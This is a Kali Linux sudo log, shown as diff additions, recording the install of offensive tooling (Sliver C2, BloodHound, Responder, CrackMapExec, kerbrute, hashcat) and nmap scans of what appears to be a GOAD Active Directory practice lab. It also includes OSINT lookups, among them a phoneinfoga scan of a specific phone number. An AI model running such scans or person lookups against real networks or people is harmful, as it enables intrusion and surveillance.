+Dec 21 16:11:29 kali sudo[18807]:     kali : TTY=pts/0 ; PWD=/home/kali/Desktop/dockali ; USER=root ; COMMAND=/usr/bin/ssh ubuntu@192.168.80.132
+Dec 21 16:11:29 kali sudo[18807]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Dec 21 16:14:33 kali sudo[18807]: pam_unix(sudo:session): session closed for user root
+-- Boot 8cd72f640f194dd7890c03d20b9e672f --
+Dec 25 13:07:34 kali sudo[2177]:     kali : TTY=pts/0 ; PWD=/home/kali/Desktop ; USER=root ; COMMAND=/usr/bin/apt update
+Dec 25 13:07:34 kali sudo[2177]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Dec 25 13:08:10 kali sudo[2177]: pam_unix(sudo:session): session closed for user root
+Dec 25 13:08:30 kali sudo[2683]:     kali : TTY=pts/0 ; PWD=/home/kali/Desktop ; USER=root ; COMMAND=/usr/bin/apt install sliver
+Dec 25 13:08:30 kali sudo[2683]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Dec 25 13:09:06 kali sudo[2683]: pam_unix(sudo:session): session closed for user root
+Dec 25 13:42:42 kali sudo[19495]:     kali : TTY=pts/0 ; PWD=/home/kali/Desktop ; USER=root ; COMMAND=/usr/bin/scp ubuntu@192.168.80.132:/home/ubuntu/kali_192.168.80.132.cfg .
+Dec 25 13:42:42 kali sudo[19495]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Dec 25 13:42:53 kali sudo[19495]: pam_unix(sudo:session): session closed for user root
+Dec 25 15:39:40 kali sudo[76340]:     kali : TTY=pts/2 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt install python3-pip
+Dec 25 15:39:40 kali sudo[76340]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Dec 25 15:39:55 kali sudo[76340]: pam_unix(sudo:session): session closed for user root
+Dec 25 15:46:23 kali sudo[79658]:     kali : TTY=pts/2 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt update
+Dec 25 15:46:23 kali sudo[79658]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Dec 25 15:46:29 kali sudo[79658]: pam_unix(sudo:session): session closed for user root
+Dec 25 15:46:29 kali sudo[79735]:     kali : TTY=pts/2 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt install -y python3-pycryptodome
+Dec 25 15:46:29 kali sudo[79735]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Dec 25 15:46:30 kali sudo[79735]: pam_unix(sudo:session): session closed for user root
+Dec 25 15:47:05 kali sudo[80037]:     kali : TTY=pts/2 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt install -y python3-pip
+Dec 25 15:47:05 kali sudo[80037]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Dec 25 15:47:06 kali sudo[80037]: pam_unix(sudo:session): session closed for user root
+Dec 25 15:51:03 kali sudo[81976]:     kali : TTY=pts/2 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt install -y python3-venv
+Dec 25 15:51:03 kali sudo[81976]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Dec 25 15:51:31 kali sudo[81976]: pam_unix(sudo:session): session closed for user root
+-- Boot 3ca9ba443c46409faa29d6dfec84eb89 --
+Jan 28 11:36:50 kali sudo[3737]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt update
+Jan 28 11:36:50 kali sudo[3737]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Jan 28 11:37:13 kali sudo[3737]: pam_unix(sudo:session): session closed for user root
+Jan 28 11:37:13 kali sudo[3970]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt install -y docker.io
+Jan 28 11:37:13 kali sudo[3970]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Jan 28 11:37:37 kali sudo[3970]: pam_unix(sudo:session): session closed for user root
+Jan 28 11:37:37 kali sudo[4853]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/systemctl start docker
+Jan 28 11:37:37 kali sudo[4853]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Jan 28 11:37:37 kali sudo[4853]: pam_unix(sudo:session): session closed for user root
+Jan 28 11:37:37 kali sudo[4858]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/systemctl enable docker
+Jan 28 11:37:37 kali sudo[4858]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Jan 28 11:37:38 kali sudo[4858]: pam_unix(sudo:session): session closed for user root
+Jan 28 11:38:10 kali sudo[5378]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/docker run --rm sundowndev/phoneinfoga scan -n +33767872939
+Jan 28 11:38:10 kali sudo[5378]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Jan 28 11:38:33 kali sudo[5378]: pam_unix(sudo:session): session closed for user root
+Jan 28 11:52:06 kali sudo[12847]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt update
+Jan 28 11:52:06 kali sudo[12847]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Jan 28 11:52:11 kali sudo[12847]: pam_unix(sudo:session): session closed for user root
+Jan 28 11:52:11 kali sudo[12904]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt install -y open-vm-tools open-vm-tools-desktop
+Jan 28 11:52:11 kali sudo[12904]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Jan 28 11:52:12 kali sudo[12904]: pam_unix(sudo:session): session closed for user root
+Jan 28 11:52:12 kali sudo[12919]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/sbin/reboot
+Jan 28 11:52:12 kali sudo[12919]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Jan 28 11:52:12 kali sudo[12919]: pam_unix(sudo:session): session closed for user root
+-- Boot c99c6e72c35a414b9bbed9cfd022aa79 --
+Jan 28 11:54:48 kali sudo[2746]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt update
+Jan 28 11:54:48 kali sudo[2746]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Jan 28 11:54:52 kali sudo[2746]: pam_unix(sudo:session): session closed for user root
+Jan 28 11:54:52 kali sudo[2820]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt install -y adwaita-icon-theme
+Jan 28 11:54:52 kali sudo[2820]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Jan 28 11:54:53 kali sudo[2820]: pam_unix(sudo:session): session closed for user root
+Jan 28 11:55:15 kali sudo[3018]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/update-alternatives --config x-cursor-theme
+Jan 28 11:55:15 kali sudo[3018]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Jan 28 11:55:22 kali sudo[3018]: pam_unix(sudo:session): session closed for user root
+-- Boot 98d055077beb4fc784df335bb6fdcde1 --
+Jan 29 09:15:56 kali sudo[3072]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt install sherlock -y
+Jan 29 09:15:56 kali sudo[3072]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Jan 29 09:16:10 kali sudo[3072]: pam_unix(sudo:session): session closed for user root
+Jan 29 09:34:23 kali sudo[12227]:     kali : TTY=pts/0 ; PWD=/home/kali/holehe ; USER=root ; COMMAND=/usr/bin/apt install -y python3-venv
+Jan 29 09:34:23 kali sudo[12227]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Jan 29 09:34:24 kali sudo[12227]: pam_unix(sudo:session): session closed for user root
+-- Boot e455390c1f484680ad1d331ceef4b49a --
+Mar 20 10:53:30 kali sudo[2617]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 20 10:53:30 kali sudo[2617]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Mar 20 10:54:19 kali sudo[2617]: pam_unix(sudo:session): session closed for user root
+Mar 20 11:40:06 kali sudo[26224]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt install ufw
+Mar 20 11:40:06 kali sudo[26224]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Mar 20 11:40:17 kali sudo[26224]: pam_unix(sudo:session): session closed for user root
+Mar 20 11:52:29 kali sudo[32701]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/sbin/service ssh start
+Mar 20 11:52:29 kali sudo[32701]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Mar 20 11:52:31 kali sudo[32701]: pam_unix(sudo:session): session closed for user root
+Mar 20 14:01:34 kali sudo[131548]: pam_unix(sudo:auth): conversation failed
+Mar 20 14:01:34 kali sudo[131548]: pam_unix(sudo:auth): auth could not identify password for [kali]
+Mar 20 14:05:04 kali sudo[136002]:     kali : TTY=pts/2 ; PWD=/home/kali/Downloads ; USER=root ; COMMAND=/usr/bin/apt install mingw-w64 -y
+Mar 20 14:05:04 kali sudo[136002]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Mar 20 14:05:43 kali sudo[136002]: pam_unix(sudo:session): session closed for user root
+-- Boot 1928dcb7061d4c74b30037a076d443be --
+Apr 22 09:59:18 kali sudo[8966]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/sbin/dhcpcd eth0
+Apr 22 09:59:18 kali sudo[8966]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 22 09:59:29 kali sudo[8966]: pam_unix(sudo:session): session closed for user root
+-- Boot ae019ab5559840edbc8c8e8f9a890a65 --
+Apr 22 10:01:15 kali sudo[1831]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/sbin/ip link set eth0 up
+Apr 22 10:01:15 kali sudo[1831]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 22 10:01:15 kali sudo[1831]: pam_unix(sudo:session): session closed for user root
+Apr 22 10:01:15 kali sudo[1853]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/systemctl restart NetworkManager
+Apr 22 10:01:15 kali sudo[1853]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 22 10:01:16 kali sudo[1853]: pam_unix(sudo:session): session closed for user root
+Apr 22 10:01:57 kali sudo[2262]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/sbin/ip link set eth0 down
+Apr 22 10:01:57 kali sudo[2262]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 22 10:01:58 kali sudo[2262]: pam_unix(sudo:session): session closed for user root
+Apr 22 10:01:58 kali sudo[2271]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/sbin/ip link set eth0 up
+Apr 22 10:01:58 kali sudo[2271]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 22 10:01:58 kali sudo[2271]: pam_unix(sudo:session): session closed for user root
+Apr 22 10:03:10 kali sudo[3089]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/systemctl restart NetworkManager
+Apr 22 10:03:10 kali sudo[3089]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 22 10:03:10 kali sudo[3089]: pam_unix(sudo:session): session closed for user root
+Apr 22 10:03:44 kali sudo[3432]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/sbin/reboot
+Apr 22 10:03:44 kali sudo[3432]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 22 10:03:44 kali sudo[3432]: pam_unix(sudo:session): session closed for user root
+-- Boot acfa45760d2b4e0dac4241c09a7394ff --
+Apr 22 10:16:05 kali sudo[7580]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/systemctl restart NetworkManager
+Apr 22 10:16:05 kali sudo[7580]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 22 10:16:06 kali sudo[7580]: pam_unix(sudo:session): session closed for user root
+Apr 22 10:16:47 kali sudo[7975]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/sbin/ip link set eth0 up
+Apr 22 10:16:47 kali sudo[7975]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 22 10:16:47 kali sudo[7975]: pam_unix(sudo:session): session closed for user root
+Apr 22 10:16:47 kali sudo[7979]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/sbin/ip addr add 192.168.0.50/24 dev eth0
+Apr 22 10:16:47 kali sudo[7979]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 22 10:16:47 kali sudo[7979]: pam_unix(sudo:session): session closed for user root
+Apr 22 10:16:47 kali sudo[7983]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/sbin/ip route add default via 192.168.0.1
+Apr 22 10:16:47 kali sudo[7983]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 22 10:16:47 kali sudo[7983]: pam_unix(sudo:session): session closed for user root
+Apr 22 10:17:38 kali sudo[8412]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/sbin/ip route add default via 192.168.0.1
+Apr 22 10:17:38 kali sudo[8412]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 22 10:17:38 kali sudo[8412]: pam_unix(sudo:session): session closed for user root
+Apr 22 10:18:45 kali sudo[8968]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/systemctl restart NetworkManager
+Apr 22 10:18:45 kali sudo[8968]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 22 10:18:45 kali sudo[8968]: pam_unix(sudo:session): session closed for user root
+-- Boot 69ba84d4a2534c199b54d94d34a1de80 --
+Apr 22 10:34:04 kali sudo[7608]:     kali : TTY=pts/2 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/sbin/ip route add 192.168.0.0/24 via 192.168.80.2
+Apr 22 10:34:04 kali sudo[7608]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 22 10:34:04 kali sudo[7608]: pam_unix(sudo:session): session closed for user root
+Apr 22 10:37:31 kali sudo[9358]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/sbin/ip route add 192.168.0.0/24 via 192.168.80.2
+Apr 22 10:37:31 kali sudo[9358]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 22 10:37:31 kali sudo[9358]: pam_unix(sudo:session): session closed for user root
+Apr 22 11:02:53 kali sudo[21804]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/gunzip /usr/share/wordlists/rockyou.txt.gz
+Apr 22 11:02:53 kali sudo[21804]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 22 11:02:54 kali sudo[21804]: pam_unix(sudo:session): session closed for user root
+-- Boot 19b40d2ed21a4473b0fedb032c0aa93a --
+Apr 29 16:24:49 kali sudo[2793]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/sbin/dhcpcd eth0
+Apr 29 16:24:49 kali sudo[2793]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 29 16:25:01 kali sudo[2793]: pam_unix(sudo:session): session closed for user root
+-- Boot 135b9ab216f24712bd612918fc5e7372 --
+Apr 29 16:31:10 kali sudo[2128]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/systemctl restart NetworkManager
+Apr 29 16:31:10 kali sudo[2128]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 29 16:31:11 kali sudo[2128]: pam_unix(sudo:session): session closed for user root
+-- Boot 5664c02cfb834c8984565bb57f5e7023 --
+Apr 30 04:33:15 kali sudo[17388]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt update
+Apr 30 04:33:15 kali sudo[17388]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 04:35:26 kali sudo[17388]: pam_unix(sudo:session): session closed for user root
+-- Boot 261e0b6f771542f8b597acbd23a19d5a --
+Apr 30 04:38:33 kali sudo[1905]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt update
+Apr 30 04:38:33 kali sudo[1905]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 04:39:00 kali sudo[1905]: pam_unix(sudo:session): session closed for user root
+Apr 30 04:39:13 kali sudo[2344]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt install -y nmap masscan netdiscover smbclient smbmap ldap-utils bloodhound neo4j responder john hashcat exiftool dnsenum dnsrecon wine
+Apr 30 04:39:13 kali sudo[2344]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 04:47:16 kali sudo[2344]: pam_unix(sudo:session): session closed for user root
+Apr 30 04:54:35 kali sudo[11294]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt-get -y install gcc clang libclang-dev libgssapi-krb5-2 libkrb5-dev libsasl2-modules-gssapi-mit musl-tools gcc-mingw-w64-x86-64
+Apr 30 04:54:35 kali sudo[11294]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 04:55:30 kali sudo[11294]: pam_unix(sudo:session): session closed for user root
+Apr 30 05:03:51 kali sudo[19467]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt install bloodhound-ce-python -y
+Apr 30 05:03:51 kali sudo[19467]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 05:04:00 kali sudo[19467]: pam_unix(sudo:session): session closed for user root
+Apr 30 05:04:16 kali sudo[19721]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt install crackmapexec -y
+Apr 30 05:04:16 kali sudo[19721]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 05:04:24 kali sudo[19721]: pam_unix(sudo:session): session closed for user root
+Apr 30 05:07:52 kali sudo[21758]:     kali : TTY=pts/0 ; PWD=/home/kali/enum4linux-ng ; USER=root ; COMMAND=/usr/bin/cp enum4linux-ng.py /usr/local/bin/enum4linux-ng
+Apr 30 05:07:52 kali sudo[21758]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 05:07:52 kali sudo[21758]: pam_unix(sudo:session): session closed for user root
+Apr 30 05:08:49 kali sudo[22223]:     kali : TTY=pts/0 ; PWD=/home/kali/enum4linux-ng ; USER=root ; COMMAND=/usr/bin/chmod +x /usr/local/bin/enum4linux-ng
+Apr 30 05:08:49 kali sudo[22223]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 05:08:49 kali sudo[22223]: pam_unix(sudo:session): session closed for user root
+Apr 30 05:09:37 kali sudo[22666]:     kali : TTY=pts/0 ; PWD=/home/kali/enum4linux-ng ; USER=root ; COMMAND=/usr/bin/mv kerbrute /usr/local/bin/
+Apr 30 05:09:37 kali sudo[22666]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 05:09:37 kali sudo[22666]: pam_unix(sudo:session): session closed for user root
+Apr 30 05:15:31 kali sudo[25736]:     kali : TTY=pts/0 ; PWD=/home/kali/vpn ; USER=root ; COMMAND=/usr/sbin/openvpn /home/kali/lilo.ovpn
+Apr 30 05:15:31 kali sudo[25736]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 05:15:31 kali sudo[25736]: pam_unix(sudo:session): session closed for user root
+Apr 30 05:17:11 kali sudo[26570]:     kali : TTY=pts/0 ; PWD=/home/kali/vpn ; USER=root ; COMMAND=/usr/sbin/openvpn /home/kali/vpn/lilo.ovpn
+Apr 30 05:17:11 kali sudo[26570]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 05:26:41 kali sudo[31110]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/nmap -T4 -F -O 192.168.56.10 192.168.56.11 192.168.56.22 192.168.56.100 -oN /home/kali/pentest/scans/goad_fast.txt
+Apr 30 05:26:41 kali sudo[31110]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 05:26:42 kali sudo[31110]: pam_unix(sudo:session): session closed for user root
+Apr 30 05:30:35 kali sudo[26570]: pam_unix(sudo:session): session closed for user root
+Apr 30 05:54:49 kali sudo[45173]:     kali : TTY=pts/0 ; PWD=/home/kali/Desktop/GOAD ; USER=root ; COMMAND=/usr/bin/apt install open-vm-tools -y
+Apr 30 05:54:49 kali sudo[45173]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 05:55:12 kali sudo[45173]: pam_unix(sudo:session): session closed for user root
+Apr 30 05:57:27 kali sudo[47125]:     kali : TTY=pts/0 ; PWD=/home/kali/Desktop/GOAD ; USER=root ; COMMAND=/usr/bin/apt install open-vm-tools open-vm-tools-desktop -y
+Apr 30 05:57:27 kali sudo[47125]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 05:57:29 kali sudo[47125]: pam_unix(sudo:session): session closed for user root
+Apr 30 05:58:07 kali sudo[47504]:     kali : TTY=pts/0 ; PWD=/home/kali/Desktop/GOAD ; USER=root ; COMMAND=/usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other
+Apr 30 05:58:07 kali sudo[47504]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 05:58:07 kali sudo[47504]: pam_unix(sudo:session): session closed for user root
+Apr 30 06:04:06 kali sudo[50484]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt install open-vm-tools open-vm-tools-desktop -y
+Apr 30 06:04:06 kali sudo[50484]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 06:04:07 kali sudo[50484]: pam_unix(sudo:session): session closed for user root
+-- Boot 573e68cb9ca4432a93518e23b3225cf6 --
+Apr 30 06:05:56 kali sudo[2059]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other
+Apr 30 06:05:56 kali sudo[2059]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 06:05:56 kali sudo[2059]: pam_unix(sudo:session): session closed for user root
+Apr 30 06:06:27 kali sudo[2384]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/mkdir -p /mnt/hgfs
+Apr 30 06:06:27 kali sudo[2384]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 06:06:27 kali sudo[2384]: pam_unix(sudo:session): session closed for user root
+Apr 30 06:06:27 kali sudo[2388]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other
+Apr 30 06:06:27 kali sudo[2388]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 06:06:27 kali sudo[2388]: pam_unix(sudo:session): session closed for user root
+Apr 30 06:27:38 kali sudo[13124]:     kali : TTY=pts/0 ; PWD=/home/kali/Desktop/GOAD ; USER=root ; COMMAND=/usr/bin/apt install seclists -y
+Apr 30 06:27:38 kali sudo[13124]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 06:29:33 kali sudo[13124]: pam_unix(sudo:session): session closed for user root
+Apr 30 10:17:07 kali sudo[124209]:     kali : TTY=pts/1 ; PWD=/home/kali/Desktop/GOAD ; USER=root ; COMMAND=/usr/bin/nano /etc/hosts
+Apr 30 10:17:07 kali sudo[124209]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 10:17:20 kali sudo[124209]: pam_unix(sudo:session): session closed for user root
+Apr 30 11:02:28 kali sudo[146261]:     kali : TTY=pts/3 ; PWD=/home/kali/Desktop/GOAD ; USER=root ; COMMAND=/usr/bin/sh -c 'echo \'192.168.56.10 sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding\' >> /etc/hosts'
+Apr 30 11:02:28 kali sudo[146261]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 11:02:28 kali sudo[146261]: pam_unix(sudo:session): session closed for user root
+Apr 30 11:34:53 kali sudo[161904]:     kali : TTY=pts/1 ; PWD=/home/kali/Desktop/GOAD ; USER=root ; COMMAND=/usr/bin/sh -c 'echo \'192.168.56.10 kingslanding.sevenkingdoms.local sevenkingdoms.local\' >> /etc/hosts'
+Apr 30 11:34:53 kali sudo[161904]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Apr 30 11:34:53 kali sudo[161904]: pam_unix(sudo:session): session closed for user root
+-- Boot fe561bd226b7448ea51d353677802e11 --
+May 13 03:48:12 kali sudo[8114]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/nmap -T5 -sS -sV -O 192.168.56.0/24
+May 13 03:48:12 kali sudo[8114]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 03:49:18 kali sudo[8114]: pam_unix(sudo:session): session closed for user root
+May 13 04:08:38 kali sudo[17678]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/sh -c 'echo \'192.168.56.10 kingslanding.sevenkingdoms.local sevenkingdoms.local\' >> /etc/hosts'
+May 13 04:08:38 kali sudo[17678]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 04:08:38 kali sudo[17678]: pam_unix(sudo:session): session closed for user root
+May 13 04:23:43 kali sudo[25050]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/date -s
+May 13 04:23:43 kali sudo[25050]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 00:00:00 kali sudo[25050]: pam_unix(sudo:session): session closed for user root
+May 13 04:51:05 kali sudo[38280]:     kali : TTY=pts/2 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/sh -c 'echo \'192.168.56.10 kingslanding.sevenkingdoms.local sevenkingdoms.local\' >> /etc/hosts'
+May 13 04:51:05 kali sudo[38280]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 04:51:05 kali sudo[38280]: pam_unix(sudo:session): session closed for user root
+May 13 04:52:58 kali sudo[39272]:     kali : TTY=pts/2 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/sed -i /kingslanding/d /etc/hosts
+May 13 04:52:58 kali sudo[39272]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 04:52:58 kali sudo[39272]: pam_unix(sudo:session): session closed for user root
+May 13 04:52:58 kali sudo[39276]:     kali : TTY=pts/2 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/sed -i /sevenkingdoms/d /etc/hosts
+May 13 04:52:58 kali sudo[39276]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 04:52:58 kali sudo[39276]: pam_unix(sudo:session): session closed for user root
+May 13 04:52:58 kali sudo[39280]:     kali : TTY=pts/2 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/sh -c 'echo \'192.168.56.10 kingslanding.sevenkingdoms.local sevenkingdoms.local kingslanding\' >> /etc/hosts'
+May 13 04:52:58 kali sudo[39280]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 04:52:58 kali sudo[39280]: pam_unix(sudo:session): session closed for user root
+May 13 04:58:24 kali sudo[41877]:     kali : TTY=pts/2 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/neo4j start
+May 13 04:58:24 kali sudo[41877]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 04:58:31 kali sudo[41877]: pam_unix(sudo:session): session closed for user root
+May 13 04:58:31 kali sudo[41979]:     kali : TTY=pts/2 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/neo4j status
+May 13 04:58:31 kali sudo[41979]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 04:58:37 kali sudo[41979]: pam_unix(sudo:session): session closed for user root
+May 13 04:58:37 kali sudo[42059]:     kali : TTY=pts/2 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/bloodhound
